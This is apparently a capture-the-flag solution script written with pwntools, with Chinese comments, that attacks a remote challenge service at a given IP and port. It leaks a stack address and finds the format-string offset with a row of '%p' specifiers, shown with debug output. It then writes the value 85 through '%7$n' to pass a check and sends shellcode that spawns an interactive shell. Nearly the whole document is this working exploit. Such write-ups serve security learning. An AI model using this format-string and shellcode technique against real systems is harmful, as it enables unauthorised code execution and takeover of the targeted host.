from pwn import *

r = remote('61.147.171.103', 52068)
context.log_level = 'debug'
context.arch = 'amd64'

r.recvuntil(b'secret[0] is ')
secret_addr = int(r.recvuntil(b'\n', drop=True), 16)
print(f"secret_addr: {secret_addr}")

r.sendlineafter(b'name be:', b'admin')
r.sendlineafter(b'or up?:', b'east')
r.sendlineafter(b'leave(0)?:', b'1')
r.sendlineafter(b"address'\n", str(secret_addr))
# r.sendlineafter(b"wish is:\n", b'aaaaaaaa.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p')  # 偏移为7
'''
需要( *a1 == a1[1] )才能执行shellcode，而a1就是main函数中的v4：*v4 = 68; v4[1] = 85;
只要利用fmt修改v4的值为85就可以满足if语句了，fmt的地方：
    _isoc99_scanf("%ld", &v2);
    puts("And, you wish is:");
    _isoc99_scanf("%s", format);
    puts("Your wish is");
    printf(format);
那就要知道v2在栈中的偏移是多少，利用：'aaaaaaaa.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p'：
        b"'Give me an address'\n"
        [DEBUG] Sent 0x4 bytes:
            b'120\n'
        [DEBUG] Sent 0x36 bytes:
            b'aaaaaaaa.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p\n'
        [DEBUG] Received 0xd bytes:
            b'Your wish is\n'
        Your wish is
        [DEBUG] Received 0xd1 bytes:
        b'aaaaaaaa.0x73e48ca04643.(nil).0x73e48c91c574.0xc.0xffffffff.0x100401a68.0x78.0x6161616161616161.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e7025.(nil)
前面输入了120作为地址，可以看到第7个位置：0x78=120 就是v2在栈上的偏移；第8个位置就是format在栈上的偏移
程序前面自动把*v4和v4[1]的地址打印出来了，所以直接输入*v4的地址，再通过fmt修改为85即可满足if条件触发写入shellcode
'''
fmt_payload = b'A'*85 + b'%7$n'  # %85c%7$n 也可以
r.sendlineafter(b"wish is:\n", fmt_payload)
shellcode = asm(shellcraft.sh())
r.sendlineafter(b'YOU SPELL', shellcode)
r.interactive()
